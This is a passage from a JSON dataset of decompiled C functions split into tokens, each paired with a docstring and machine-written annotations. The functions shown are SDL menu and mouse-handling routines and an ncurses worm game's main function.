            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "720",
            ")",
            "goto",
            "LABEL_13",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "139",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "280",
            ")",
            "LABEL_13",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "140",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "140",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "799",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "1020",
            ")",
            "goto",
            "LABEL_23",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "139",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "280",
            ")",
            "LABEL_23",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "140",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "140",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "599",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "720",
            ")",
            "goto",
            "LABEL_33",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "329",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "470",
            ")",
            "LABEL_33",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "330",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "330",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "799",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "1020",
            ")",
            "goto",
            "LABEL_43",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "329",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "470",
            ")",
            "LABEL_43",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "330",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "330",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "599",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "720",
            ")",
            "goto",
            "LABEL_53",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "519",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "660",
            ")",
            "LABEL_53",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "520",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "600",
            ",",
            "520",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "799",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "1020",
            ")",
            "goto",
            "LABEL_63",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "519",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "660",
            ")",
            "LABEL_63",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "520",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "800",
            ",",
            "520",
            ",",
            "120",
            ",",
            "140",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "620",
            ",",
            "160",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"1\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "820",
            ",",
            "160",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"2\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "620",
            ",",
            "350",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"3\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "820",
            ",",
            "350",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"4\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "620",
            ",",
            "540",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"5\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "820",
            ",",
            "540",
            ",",
            "80",
            ",",
            "100",
            ",",
            "\"6\"",
            ")",
            ";",
            "drawLogo",
            "(",
            "rend",
            ",",
            "img",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely implements a stack data structure, with variations across snippets including stack implementation for a binary search tree (BST), a runtime stack for executing JavaScript functions, and a general-purpose stack data structure possibly for managing memory or program execution flow.",
            "The function `malloc` is used to allocate memory dynamically, as demonstrated in the code snippets by providing memory allocation and deallocation functionalities, enabling the creation and manipulation of various data structures and algorithms in the C programming language.",
            "The function `SDL_GetMouse` is used to retrieve the current position of the mouse cursor within a window in SDL-based applications, facilitating cursor tracking and event handling."
        ],
        "longer_label": "The code defines a function `drawLevelSelector` in C, utilizing SDL for rendering, TTF_Font for text rendering, and a custom stack-like structure, to draw a level selector interface with boxes and options, while also managing mouse input and reporting potential memory errors."
    },
    {
        "id": 200,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "the",
            "mouse",
            "coordinates",
            "and",
            "returns",
            "specific",
            "values",
            "based",
            "on",
            "the",
            "position",
            "of",
            "the",
            "mouse",
            "within",
            "defined",
            "ranges",
            ",",
            "such",
            "as",
            "returning",
            "Exit",
            "if",
            "the",
            "mouse",
            "is",
            "within",
            "the",
            "SDL_QUIT",
            "event",
            ",",
            "Sandbox",
            "if",
            "within",
            "a",
            "certain",
            "range",
            ",",
            "and",
            "Career",
            "if",
            "within",
            "another",
            "range",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "_DWORD",
            "*",
            "v2",
            ";",
            "int",
            "result",
            ";",
            "char",
            "v4",
            "[",
            "248",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v0",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v1",
            "=",
            "__asan_stack_malloc_2",
            "(",
            "224L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v1",
            ")",
            "v0",
            "=",
            "v1",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "8",
            ")",
            "=",
            "\"3 32 4 7 mouse_x 96 4 7 mouse_y 160 56 5 event \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "16",
            ")",
            "=",
            "MouseReader1",
            ";",
            "v2",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v2",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v2",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862726",
            "]",
            "=",
            "-",
            "234881024",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_PollEvent",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "160",
            ")",
            "=",
            "=",
            "256",
            ")",
            "{",
            "result",
            "=",
            "0",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "}",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "SDL_GetMouseState",
            "(",
            "v0",
            "+",
            "32",
            ",",
            "v0",
            "+",
            "96",
            ")",
            ")",
            "goto",
            "LABEL_27",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "649",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "950",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "119",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "320",
            ")",
            "{",
            "result",
            "=",
            "1",
            ";",
            "goto",
            "LABEL_28",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "649",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "950",
            ")",
            "goto",
            "LABEL_27",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "419",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "620",
            ")",
            "result",
            "=",
            "2",
            ";",
            "else",
            "LABEL_27",
            ":",
            "result",
            "=",
            "-",
            "1",
            ";",
            "LABEL_28",
            ":",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v0",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "-",
            "168430091",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"stack\" appears to be used to create and manipulate a data structure representing a stack, which can be used for managing and storing various types of data in a Last In First Out (LIFO) manner.",
            "The `malloc` function in the provided code snippets seems to be a simplified implementation of dynamic memory allocation using the `GlobalAlloc` function, primarily utilized in C programming for allocating memory on the heap."
        ],
        "longer_label": "The provided code defines a function `MouseReader1` that appears to handle mouse events using SDL, featuring memory allocation and stack manipulation, with annotations suggesting it involves creating and managing a stack data structure and utilizing simplified `malloc` for dynamic memory allocation."
    },
    {
        "id": 201,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "an",
            "ncurses",
            "window",
            ",",
            "sets",
            "up",
            "various",
            "game",
            "functions",
            "and",
            "timers",
            ",",
            "creates",
            "a",
            "game",
            "board",
            "with",
            "a",
            "worm",
            "and",
            "apples",
            ",",
            "and",
            "then",
            "runs",
            "a",
            "scheduler",
            "to",
            "update",
            "the",
            "game",
            "display",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "WINDOW",
            "*",
            "v3",
            ";",
            "WINDOW",
            "*",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "v3",
            "=",
            "initscr",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "{",
            "_fprintf_chk",
            "(",
            "stderr",
            ",",
            "1L",
            "L",
            ",",
            "\"Error initializing ncurses.\\n\"",
            ")",
            ";",
            "exit",
            "(",
            "2",
            ")",
            ";",
            "}",
            "v4",
            "=",
            "v3",
            ";",
            "v5",
            "=",
            "time_ms",
            "(",
            "argc",
            ",",
            "argv",
            ")",
            ";",
            "srand",
            "(",
            "v5",
            ")",
            ";",
            "noecho",
            "(",
            ")",
            ";",
            "keypad",
            "(",
            "v4",
            ",",
            "1",
            ")",
            ";",
            "wtimeout",
            "(",
            "stdscr",
            ",",
            "0",
            ")",
            ";",
            "init_display",
            "(",
            ")",
            ";",
            "memset",
            "(",
            "board",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "board",
            ")",
            ")",
            ";",
            "board",
            "[",
            "625",
            "]",
            "=",
            "1",
            ";",
            "add_job",
            "(",
            "update_worm",
            ",",
            "200L",
            "L",
            ")",
            ";",
            "add_job",
            "(",
            "draw_board",
            ",",
            "33L",
            "L",
            ")",
            ";",
            "add_job",
            "(",
            "read_input",
            ",",
            "150L",
            "L",
            ")",
            ";",
            "add_job",
            "(",
            "update_apples",
            ",",
            "120L",
            "L",
            ")",
            ";",
            "add_job",
            "(",
            "generate_apple",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "generate_apple",
            "(",
            ")",
            ";",
            "generate_apple",
            "(",
            ")",
            ";",
            "generate_apple",
            "(",
            ")",
            ";",
            "generate_apple",
            "(",
            ")",
            ";",
            "generate_apple",
            "(",
            ")",
            ";",
            "run_scheduler",
            "(",
            ")",
            ";",
            "delwin",
            "(",
            "v4",
            ")",
            ";",
            "endwin",
            "(",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
